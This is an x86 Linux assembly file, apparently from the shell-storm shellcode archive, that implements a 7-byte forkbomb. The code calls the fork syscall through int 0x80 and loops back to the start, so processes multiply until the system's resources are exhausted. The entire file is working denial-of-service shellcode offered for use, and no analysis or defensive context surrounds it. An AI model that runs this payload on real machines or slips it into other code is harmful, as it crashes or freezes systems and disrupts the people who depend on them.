; http://shell-storm.org/shellcode/files/shellcode-214.php
; By Kris Katterjohn 8/29/2006
; 7 byte shellcode for a forkbomb

section .text
global _start

_start:
	push byte 2
	pop eax
	int 0x80
	jmp short _start

